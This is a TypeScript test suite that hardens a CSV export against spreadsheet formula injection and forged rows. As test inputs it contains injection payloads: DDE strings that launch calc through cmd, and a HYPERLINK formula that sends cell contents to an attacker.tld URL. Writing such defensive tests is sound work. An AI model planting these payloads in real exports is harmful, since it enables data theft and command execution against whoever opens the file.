import { assertEquals } from "@test/assert";
import { generateCSV } from "./generateCSV";

// Split a CSV document into its physical lines. Used to assert that a single
// record can never be spread over more than one row.
function lines(csv: string): string[] {
    return csv.split("\n");
}

function runTests() {
    console.log("Running CSV export hardening tests...");

    // A value must not be able to start a formula that the spreadsheet would
    // evaluate once the admin opens the export.
    {
        const csv = generateCSV([
            {
                actor: `+cmd|'/c calc.exe'!A1`,
                path: `-2+3+cmd|'/c calc'!A0`,
                host: `@SUM(1+1)`
            }
        ]);

        assertEquals(
            csv,
            "actor,path,host\n" +
                `'+cmd|'/c calc.exe'!A1,'-2+3+cmd|'/c calc'!A0,'@SUM(1+1)`,
            "Formula prefixes should be neutralised with a leading apostrophe"
        );
    }

    // The primary attack from the issue report: a virtual API key name that
    // exfiltrates a neighbouring cell to an attacker controlled URL.
    {
        const csv = generateCSV([
            { actor: `=HYPERLINK("http://attacker.tld/?d="&A1,"click me")` }
        ]);

        assertEquals(
            csv,
            `actor\n"'=HYPERLINK(""http://attacker.tld/?d=""&A1,""click me"")"`,
            "Hyperlink formula built from a virtual API key name should not evaluate"
        );
    }

    // Quoting alone does not help, but a quoted cell still has to survive the
    // round trip and keep the remaining columns on the same row.
    {
        const csv = generateCSV([{ actor: `="a","b"`, path: "/quoted" }]);

        assertEquals(
            csv,
            `actor,path\n"'=""a"",""b""",/quoted`,
            "A quoted formula should stay in one cell and leave later columns intact"
        );
    }

    // Spreadsheets ignore leading whitespace before deciding a cell is a
    // formula, so a tab prefix is dangerous too.
    {
        const csv = generateCSV([{ actor: "\t=1+1" }]);

        assertEquals(
            csv,
            "actor\n'\t=1+1",
            "A tab before a formula should be neutralised"
        );
    }

    // CR, LF and CRLF all end a record for some parsers. Collapsing them keeps
    // one record on one line so a value cannot forge additional rows.
    {
        const csv = generateCSV([{ actor: "me", path: "/multi\n=1+1\nline3" }]);

        assertEquals(
            csv,
            "actor,path\nme,/multi\\n=1+1\\nline3",
            "Embedded newlines should collapse to a literal escape sequence"
        );
        assertEquals(
            lines(csv).length,
            2,
            "A record containing newlines should still occupy exactly one line"
        );
    }

    // A record that ends in CRLF must not be able to open an empty row either.
    {
        const csv = generateCSV([{ actor: "me\r\nsecond", path: "/crlf" }]);

        assertEquals(
            csv,
            "actor,path\nme\\nsecond,/crlf",
            "CRLF should collapse the same way a bare LF does"
        );
        assertEquals(
            lines(csv).length,
            2,
            "A record containing CRLF should still occupy exactly one line"
        );
    }

    // A quote without a comma used to skip escaping entirely and eat the
    // columns that followed it.
    {
        const csv = generateCSV([{ actor: `evil"cell`, path: "/p" }]);

        assertEquals(
            csv,
            `actor,path\n"evil""cell",/p`,
            "A quote without a comma should still be escaped"
        );
    }

    // Ordinary values, commas and quotes should be untouched so the export
    // stays readable.
    {
        const csv = generateCSV([
            {
                id: 1,
                timestamp: 1700000000,
                action: true,
                host: "app.example.com",
                path: "/api/v1/users",
                metadata: null,
                userAgent: undefined
            },
            {
                id: 2,
                timestamp: 1700000001,
                action: false,
                host: "app.example.com",
                path: '/search?q=a,b"c',
                metadata: null,
                userAgent: undefined
            }
        ]);

        assertEquals(
            csv,
            [
                "id,timestamp,action,host,path,metadata,userAgent",
                "1,1700000000,true,app.example.com,/api/v1/users,,",
                `2,1700000001,false,app.example.com,"/search?q=a,b""c",,`
            ].join("\n"),
            "Benign rows should be emitted unchanged"
        );
    }

    // A formula prefix is only dangerous at the start of a cell, so it must not
    // be added mid-value.
    {
        const csv = generateCSV([{ host: "a=b.example.com" }]);

        assertEquals(
            csv,
            "host\na=b.example.com",
            "Only leading prefixes should be neutralised"
        );
    }

    // Headers go through the same encoder so a column name containing a comma
    // cannot desynchronise every row from the header row.
    {
        const csv = generateCSV([{ "a,b": "1", actor: "me" }]);

        assertEquals(
            csv,
            '"a,b",actor\n1,me',
            "A header containing a comma should be quoted"
        );
    }

    // The empty result is a fixed header row and must stay byte for byte the
    // same, since the UI relies on downloading a valid file even with no rows.
    {
        assertEquals(
            generateCSV([]),
            "orgId,action,actorType,timestamp,actor\n",
            "An empty export should keep its placeholder header row"
        );
    }

    console.log("All CSV export hardening tests passed!");
}

try {
    runTests();
} catch (error) {
    console.error("Test failed:", error);
process.exit(1);
}
